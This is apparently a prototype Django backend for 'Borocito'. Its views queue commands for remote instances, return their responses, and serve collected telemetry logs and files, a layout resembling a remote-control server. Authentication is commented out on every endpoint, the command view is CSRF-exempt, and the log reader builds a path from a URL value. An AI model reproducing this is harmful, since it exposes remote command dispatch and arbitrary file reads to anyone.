from django.http import HttpResponse, StreamingHttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings

import os
from datetime import datetime
import mimetypes
from wsgiref.util import FileWrapper

# Create your views here.
from api.models import Instancia, Telemetria
from control.utilities import control_instance_endpoint

# TODO : mejorar, esto es un prototipo.

@csrf_exempt
#@control_instance_endpoint
def instance(request, uuid):
    instancia = Instancia.objects.get(uuid=uuid)
    if request.method == "POST":
        instancia.command = request.POST.get('command')
        instancia.save(update_fields=['command'])
        return HttpResponse("OK!", content_type="plain/text")
    if request.method == "GET":
        # TODO : dentro del Borocito-CLI, enviar respuesta, no la estructura completa
        respuesta = str(f"#|{instancia.username}@{instancia.domain}|{instancia.uuid}|{instancia.borocito}\r\n")
        respuesta += str(f"{instancia.response}{"\r\n" if instancia.response else ""}")
        return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def get_user_report(request, uuid):
    instancia = Instancia.objects.get(uuid=uuid)
    return HttpResponse(instancia.plain(), content_type="plain/text")

#@control_instance_endpoint
def get_telemetry_log(request, uuid):
    respuesta = open(str(f"{settings.BOROCITO_TELEMETRY_DIR}/{uuid}.log"), "r").read()
    return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def get_telemetry_file(request, uuid):
    telemetria = Telemetria.objects.get(uuid=uuid)
    filename = os.path.basename(telemetria.telemetry.path)
    response = StreamingHttpResponse(
        FileWrapper(open(telemetria.telemetry.path, "rb")),
        content_type=mimetypes.guess_type(str(f"{telemetria.filename}"))[0],
    )
    response["Content-Length"] = os.path.getsize(telemetria.telemetry.path)
    response["Content-Disposition"] = f"attachment; filename={filename}"
    return response

#@control_instance_endpoint
def list_instances(request):
    instancias = Instancia.objects.all()
    respuesta = ""
    for instancia in instancias:
        respuesta += str(f"{instancia.uuid}|")
    return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def list_telemetry_logs(request):
    respuesta = ""
    telemetrias = os.listdir(settings.BOROCITO_TELEMETRY_DIR)
    for file in telemetrias:
        if ".log" in file:
            respuesta += str(f"{file}\r\n")
    return HttpResponse(respuesta, content_type="plain/text")

#@control_instance_endpoint
def list_telemetry_files(request):
    telemetrias = Telemetria.objects.all()
    respuesta = ""
    for telemetria in telemetrias:
        respuesta += str(f"{telemetria.filename}\r\n")
    return HttpResponse(respuesta, content_type="plain/text")
